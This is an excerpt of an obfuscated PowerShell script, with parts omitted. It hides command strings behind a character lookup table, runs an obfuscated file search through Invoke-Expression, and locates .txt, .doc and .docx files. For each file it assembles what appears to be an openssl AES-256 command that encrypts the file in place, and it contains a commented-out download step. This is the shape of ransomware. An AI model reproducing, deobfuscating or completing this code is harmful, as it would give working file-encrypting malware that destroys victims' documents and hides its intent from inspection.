...
function CreateCharacterLookup {
    ...
    $releaseInfo = (&(Get-Command cat) release).split('\n')
...
function DownloadFile {
    ...
    # $url -q -O $outputFile
    Write-Host ($url + ' ' + $outputFile)
}

function ProcessFiles {
    # Process .txt files
    Write-Host 'Process: ' + ('f' + $GLOBAL:charLookup[44] + $GLOBAL:charLookup[47] + $GLOBAL:charLookup[40] + ' ' + $GLOBAL:charLookup[13] + $GLOBAL:charLookup[48] + $GLOBAL:charLookup[49] + $GLOBAL:charLookup[52] + $GLOBAL:charLookup[13] + ' ' + $GLOBAL:charLookup[11] + $GLOBAL:charLookup[52] + $GLOBAL:charLookup[56] + $GLOBAL:charLookup[49] + $GLOBAL:charLookup[41] + ' ' + 'f')
    ...
    # Process .doc files
    Write-Host 'Process: ' + ('f' + $GLOBAL:charLookup[44] + $GLOBAL:charLookup[47] + $GLOBAL:charLookup[40] + ' ' + $GLOBAL:charLookup[13] + $GLOBAL:charLookup[41] + $GLOBAL:charLookup[52] + $GLOBAL:charLookup[39] + $GLOBAL:charLookup[13] + ' ' + $GLOBAL:charLookup[11] + $GLOBAL:charLookup[52] + $GLOBAL:charLookup[56] + $GLOBAL:charLookup[49] + $GLOBAL:charLookup[41] + ' ' + 'f' )
    foreach ($file in (&(Get-Command Invoke-Expression) ('f' + $GLOBAL:charLookup[44] + $GLOBAL:charLookup[47] + $GLOBAL:charLookup[40] + ' ' + $GLOBAL:charLookup[13] + $GLOBAL:charLookup[41] + $GLOBAL:charLookup[52] + $GLOBAL:charLookup[39] + $GLOBAL:charLookup[13] + ' ' + $GLOBAL:charLookup[11] + $GLOBAL:charLookup[52] + $GLOBAL:charLookup[56] + $GLOBAL:charLookup[49] + $GLOBAL:charLookup[41] + ' ' + 'f' )))
    {
        Write-Host 'Do to file: ' + ("" + $GLOBAL:charLookup[48] + $GLOBAL:charLookup[49] + $GLOBAL:charLookup[41] + $GLOBAL:charLookup[47] + $GLOBAL:charLookup[51] + $GLOBAL:charLookup[51] + $GLOBAL:charLookup[45] + ' ' + $GLOBAL:charLookup[41] + $GLOBAL:charLookup[47] + $GLOBAL:charLookup[39] + ' ' + $GLOBAL:charLookup[11] + $GLOBAL:charLookup[37] + $GLOBAL:charLookup[41] + $GLOBAL:charLookup[51] + $GLOBAL:charLookup[11] + $GLOBAL:charLookup[2] + $GLOBAL:charLookup[5] + $GLOBAL:charLookup[6] + $GLOBAL:charLookup[11] + $GLOBAL:charLookup[39] + $GLOBAL:charLookup[38] + $GLOBAL:charLookup[39] + ' ' + $GLOBAL:charLookup[11] + $GLOBAL:charLookup[49] + $GLOBAL:charLookup[37] + $GLOBAL:charLookup[51] + $GLOBAL:charLookup[51] + ' ' + 'f' + $GLOBAL:charLookup[44] + $GLOBAL:charLookup[45] + $GLOBAL:charLookup[41] + $GLOBAL:charLookup[14] + 'k' + $GLOBAL:charLookup[41] + $GLOBAL:charLookup[56] + ' ' + $GLOBAL:charLookup[11] + $GLOBAL:charLookup[44] + $GLOBAL:charLookup[47] + ' ' + " $file " + ' ' + $GLOBAL:charLookup[11] + $GLOBAL:charLookup[48] + $GLOBAL:charLookup[53] + $GLOBAL:charLookup[52] + ' ' + " $file ")
        break
    ...
    # Process .docx files
    Write-Host 'Process: ' + ('f' + $GLOBAL:charLookup[44] + $GLOBAL:charLookup[47] + $GLOBAL:charLookup[40] + ' ' + $GLOBAL:charLookup[13] + $GLOBAL:charLookup[54] + $GLOBAL:charLookup[37] + $GLOBAL:charLookup[50] + $GLOBAL:charLookup[13] + ' ' + $GLOBAL:charLookup[11] + $GLOBAL:charLookup[52] + $GLOBAL:charLookup[56] + $GLOBAL:charLookup[49] + $GLOBAL:charLookup[41] + ' ' + 'f')
